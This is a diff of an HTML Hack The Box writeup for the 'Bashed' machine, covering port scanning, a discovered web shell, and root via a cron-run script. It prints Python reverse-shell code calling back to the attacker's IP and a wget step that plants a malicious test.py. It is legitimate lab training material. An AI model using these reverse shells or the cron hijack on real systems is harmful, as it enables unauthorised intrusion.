@@ -1,104 +1,351 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bashed &mdash; HTB Writeup</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bashed &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
 </head>
 <body>
-    <main class="main-content">
-        <div class="content-card">
-<div class="writeup-content">
-    <div style="text-align: center;">
-        <h1>Hack The Box</h1>
-        <h2>Bashed</h2>
-        <img src="/pngs/HTB/Easy/Bashed/Bashed.png" alt="Bashed Banner" style="border:none; width: 300px; margin-bottom: 20px;">
-        <h3 style="color: #3fb950;">Level: Easy</h3>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Bashed/Bashed.png" alt="Bashed machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Bashed</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
     </div>
+  </div>
+</header>
 
-    <h3 class="step-header">1. Enumeration</h3>
-    <p>I started with a full port scan using Nmap:</p>
-    <div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.10.68</div>
-    
-    <ul>
-        <li><strong>-p- --open</strong>: Scans all 65535 ports, showing only open ones.</li>
-        <li><strong>-sS</strong>: Stealth SYN scan.</li>
-        <li><strong>-Pn -n</strong>: Skips host discovery and DNS resolution for speed.</li>
-    </ul>
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">1. Enumeration</a></li>
+    <li><a href="#privilege-escalation">2. Privilege Escalation</a></li>
+  </ul>
+</nav>
 
-    <p>Only port 80 was open. Service scan:</p>
-    <div class="terminal-box">nmap -sC -sV -p80 10.10.10.68</div>
-    <ul>
-        <li><strong>-sC</strong>: Runs default scripts.</li>
-        <li><strong>-sV</strong>: Enumerates for the version running.</li>
-    </ul>
+<h2 id="enumeration">1. Enumeration</h2>
+<p>I started with a full port scan using Nmap:</p>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.10.68</div>
+<ul>
+  <li><strong>-p- --open</strong>: Scans all 65535 ports, showing only open ones.</li>
+  <li><strong>-sS</strong>: Stealth SYN scan.</li>
+  <li><strong>-Pn -n</strong>: Skips host discovery and DNS resolution for speed.</li>
+</ul>
 
-     <p>The domain is <code>bashed.htb</code>. I updated my <code>/etc/hosts</code>: <p></p>
+<p>Only port 80 was open. Service scan:</p>
+<div class="terminal-box">nmap -sC -sV -p80 10.10.10.68</div>
+<ul>
+  <li><strong>-sC</strong>: Runs default scripts.</li>
+  <li><strong>-sV</strong>: Enumerates for the version running.</li>
+</ul>
 
-    <div class="terminal-box">echo "10.10.10.68 bashed.htb" | sudo tee -a /etc/hosts</div>
+<p>The domain is <code>bashed.htb</code>. I updated my <code>/etc/hosts</code>:</p>
+<div class="terminal-box">echo "10.10.10.68 bashed.htb" | sudo tee -a /etc/hosts</div>
 
-        <p>Next step is directory enumeration:</p>
-    
-    <div class="terminal-box">gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt</div>
-    
-    <p>Discovered <code>/dev/phpbash.php</code>—a web shell. We can find the user flag at the arrexel's home directory.</p>
+<p>Next step is directory enumeration:</p>
+<div class="terminal-box">gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt</div>
 
-    <fieldset class="cred-box">
-        <legend>User Flag</legend>
-        <code>9b5f9adaa7f8ee097b68bd599e3...</code>
-    </fieldset>
+<p>Discovered <code>/dev/phpbash.php</code>, a web shell. We can find the user flag at the arrexel's home directory.</p>
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
-    <h3 class="step-header">2. Privilege Escalation</h3>
-    <p>To get a proper shell, I started a listener on my machine:</p>
-    <div class="terminal-box">nc -lvnp 1234</div>
+<h2 id="privilege-escalation">2. Privilege Escalation</h2>
+<p>To get a proper shell, I started a listener on my machine:</p>
+<div class="terminal-box">nc -lvnp 1234</div>
 
-    <p>Executed a Python reverse shell from the web UI:</p>
+<p>Executed a Python reverse shell from the web UI:</p>
 <div class="terminal-box">python -c 'import socket,subprocess,os; \
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
 s.connect(("10.10.14.17",1234)); \
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
 p=subprocess.call(["/bin/sh","-i"]);'</div>
 
-    <p>I upgraded my shell</p>
+<p>I upgraded my shell:</p>
+<div class="terminal-box">python -c 'import pty; pty.spawn("/bin/bash")'</div>
 
-    <div class="terminal-box"> python -c 'import pty; pty.spawn("/bin/bash")'</div>
-    
-    <p>Checking sudo permissions:</p>
-    <div class="terminal-box">sudo -l</div>
-    <p>We can run commands as <b>scriptmanager</b> without a password. Switching users:</p>
-    <div class="terminal-box">sudo -i -u scriptmanager</div>
+<p>Checking sudo permissions:</p>
+<div class="terminal-box">sudo -l</div>
+<p>We can run commands as <strong>scriptmanager</strong> without a password. Switching users:</p>
+<div class="terminal-box">sudo -i -u scriptmanager</div>
 
-    <p>Inside <code>/scripts</code>, I found <code>test.py</code> which is executed by root.</p>
-    <p>I created a new <code>test.py</code> to my machine and replaced the old one with my new one.</p>
-    <div class="terminal-box">import socket,subprocess,os
+<p>Inside <code>/scripts</code>, I found <code>test.py</code> which is executed by root.</p>
+<p>I created a new <code>test.py</code> on my machine and replaced the old one with it.</p>
+<div class="terminal-box">import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.10.14.17",9002))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 import pty; pty.spawn("sh")
-    
+
 ## This is the new test.py with my IP</div>
 
-    <p>I opened a new listener to port 9002 and I opened a http server.</p>
-    <div class="terminal-box">python3 -m http.server 8000</div>
-    <p>From the reverse shell I downloaded the new test.py.</p>
-    <div class="terminal-box">wget http://10.10.14.17:8000/test.py -O /scripts/test.py</div>
-    <p>I have to change permissions to be accessible through everyone.</p>
-    <div class="terminal-box">chmod 777 test.py</p></div>
-        
-    <p>After a minute, the cronjob executed the script and granted root access.</p>
+<p>I opened a new listener on port 9002 and started an HTTP server.</p>
+<div class="terminal-box">python3 -m http.server 8000</div>
+<p>From the reverse shell I downloaded the new test.py.</p>
+<div class="terminal-box">wget http://10.10.14.17:8000/test.py -O /scripts/test.py</div>
+<p>I have to change permissions so everyone can access it.</p>
+<div class="terminal-box">chmod 777 test.py</div>
 
-    <img src="/pngs/HTB/Easy/Bashed/Pasted%20image%2020250423145542.png">
-    <fieldset class="root-box">
-        <legend>Root Flag</legend>
-        <code>318b1a2f4579d0e8161424267a7....</code>
-    </fieldset>
+<p>After a minute, the cronjob executed the script and granted root access.</p>
+<figure>
+  <img src="/pngs/HTB/Easy/Bashed/Pasted%20image%2020250423145542.png" alt="Root shell" loading="lazy">
+</figure>
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
 </div>
-        </div>
-    </main>
-    <script src="/copy.js"></script>
-    <script src="/nav.js"></script>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
 </body>
 </html>
